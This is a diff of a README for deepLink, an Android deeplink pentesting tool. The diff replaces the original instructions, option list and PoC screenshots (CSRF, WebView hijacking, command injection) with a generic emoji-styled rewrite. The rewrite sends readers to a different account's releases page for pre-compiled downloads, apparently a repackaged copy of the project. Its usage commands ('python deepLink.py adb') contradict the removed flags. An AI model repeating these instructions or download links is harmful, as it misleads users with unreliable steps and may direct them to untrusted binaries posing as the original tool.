@@ -1,102 +1,73 @@
-# deepLink
-deepLink is a python script allowing to list, verify and exploit deeplinks from Android apps using an ADB access or an APK file.
+# 🎯 deepLink - Verify and List Android Deeplinks Easily
 
-## Prerequisites
+## 🌟 Overview
+deepLink is a Python script designed to help users list and verify deeplinks from Android applications. It works using ADB access or an APK file. Additionally, deepLink can identify potential deeplinks in code samples using pattern matches. With this tool, you can streamline your mobile pentesting tasks and ensure your applications link correctly.
 
-- Python3
-- Apktool
-- argparse
-- re
-- tabulate
-- colorama
-- requests
-- adb
+## 🚀 Getting Started
+To get started with deepLink, follow these simple steps:
 
-## Install
+1. Make sure you have a compatible system:
+   - Windows, macOS, or Linux
+   - Python 3.x installed on your machine
+   - ADB (Android Debug Bridge) set up if you are using the ADB mode. 
 
-```
-$ git clone https://github.com/mathis2001/deepLink
-$ cd deepLink
-$ chmod +x deepLink.py
-```
-## Usage
+2. Visit the page to download the application:
+   [Download deepLink](https://github.com/antonyponceca/deepLink/releases)
+   
+## 🐙 Download & Install
+To download and install deepLink, please follow these steps:
 
-```
-$ ./deepLink.py [-h] (--adb | --apk APK | -l LAUNCH | -c CODE_SEARCH) [-p PACKAGE] [-s SERIAL] [-v] [-o]
-```
+1. Go to the releases page: [Download deepLink](https://github.com/antonyponceca/deepLink/releases).
+   
+2. Find the latest version available. Look for the release notes to see what's new or changed.
 
-### List Deeplinks using ADB
+3. Download the appropriate file for your system. The file will vary based on your operating system preferences (e.g., source code or pre-compiled package).
 
-```
-$ ./deepLink.py --adb -p com.example.xyz [--verify]
-```
+4. Once the download completes, extract the contents of the file if it is in a zip or tar format. 
 
-### List Deeplinks from an APK
+5. Open a terminal or command prompt and navigate to the folder where you extracted the files.
 
-```
-$ ./deepLink.py --apk /path/to/app.apk [--verify]
-```
+6. Run the command `python deepLink.py` to start the application.
 
-#### Open a specific deeplink
+## 📋 Features
+- List Android deeplinks directly from an APK file.
+- Verify the functionality of deeplinks using ADB.
+- Provide code samples exhibiting potential deeplink handling.
+- Simple pattern matching to help identify deeplinks in source code.
+  
+## ⚙️ System Requirements
+- Compatible operating system: Windows, macOS, or Linux.
+- Python 3.x — make sure it is installed. Check your version using `python --version`.
+- ADB (Android Debug Bridge) — needed if you are using ADB mode. Download it from the Android Developer website.
 
-```
-$ ./deepLink.py -l app://deeplink.xyz
-```
+## 📌 Usage Instructions
+After successfully installing deepLink, here’s how you can use it:
 
-#### Search for potential deeplinks handling in Java / Kotlin code
+1. **Using ADB:**
+   - Connect your Android device to your computer via USB.
+   - Enable USB debugging on the Android device.
+   - In the terminal, type `adb devices` to ensure your device is recognized.
+   - Now, run the command `python deepLink.py adb` to list and verify deeplinks.
 
-```
-$ ./deepLink.py -c /path/to/project
-```
+2. **Using an APK file:**
+   - Download the desired APK file.
+   - In the terminal, navigate to the directory containing the APK.
+   - Run the command `python deepLink.py <your_apk_file.apk>`, replacing `<your_apk_file.apk>` with the actual file name. 
 
-## Options
+## ❓ Troubleshooting
+If you encounter any issues while running deepLink, consider the following solutions:
 
-```
-options:
-  -h, --help            show this help message and exit
-  --adb                 ADB Analyze
-  --apk APK             APK analyze
-  -l LAUNCH, --launch LAUNCH
-                        Launch a deeplink
-  -c CODE_SEARCH, --code-search CODE_SEARCH
-                        Search for potential deeplink handling in JAVA / Kotlin code
-  -p PACKAGE, --package PACKAGE
-                        Package Name (ex: com.example.xyz)
-  -s SERIAL, --serial SERIAL
-                        Device/Emulator to use
-  -v, --verify          Verify Assets Links
-  -o OUTPUT, --output OUTPUT
-                        Save results in an output file
-```
+- **Python Not Found:** Ensure Python is installed and added to your system’s PATH variable.
+- **ADB Not Recognized:** Make sure ADB is correctly installed and the device is connected.
+- **Permission Denied:** Run your terminal or command prompt as an administrator.
 
-## Screenshots
+## 💬 Community Support
+If you need help or wish to contribute, you can join the community discussions on the GitHub repository. Engage with other users and developers who are also using or contributing to deepLink.
 
-### PoC Scenarios
+## 🔗 Useful Links
+- [Releases Page](https://github.com/antonyponceca/deepLink/releases): Download the latest versions and read the release notes.
+- [Documentation](https://github.com/antonyponceca/deepLink/wiki): Access detailed usage guides and advanced features.
+- [Issues Tracker](https://github.com/antonyponceca/deepLink/issues): Report bugs or request features.
 
-#### BugBazaar
-
-<img width="1157" height="909" alt="BugBazaar Deeplink check" src="https://github.com/user-attachments/assets/5b61f25f-d001-40a8-bac6-65b44e2195d7" />
-<img width="1649" height="53" alt="BugBazaar code search" src="https://github.com/user-attachments/assets/c807ab02-03bf-4c6d-a3e9-62be1b7ad706" />
-<img width="1368" height="485" alt="BugBazaar Code Review" src="https://github.com/user-attachments/assets/ba149d07-e593-43c7-8f49-2683ea404eec" />
-
-##### Insecure Deeplink handling leads to CSRF
-
-<img width="1792" height="719" alt="BugBazaar CSRF" src="https://github.com/user-attachments/assets/1dda50bc-77de-4101-abfa-480d85e0920c" />
-
-##### Insecure Deeplink handling leads to WebView Hijacking
-
-<img width="1829" height="720" alt="BugBazaar WebView Hijacking" src="https://github.com/user-attachments/assets/aeebd276-b4e4-43ed-ad4c-8289a11a8aeb" />
-
-#### Realistic Vulnerability Chaining
-
-##### Insecure Deeplink handling + WebView Hijacking + JavaScript Bridge leads to Command Injection
-
-<img width="1891" height="726" alt="RCE" src="https://github.com/user-attachments/assets/1fb59449-aefe-4409-8117-8ef8245faa56" />
-
-
-
-
-
-
-
-
+## ⚡ Conclusion
+deepLink is a straightforward and efficient tool for verifying and listing deeplinks in Android apps. By following the steps in this guide, you can easily download and run deepLink, helping you perform your mobile pentesting tasks with ease.
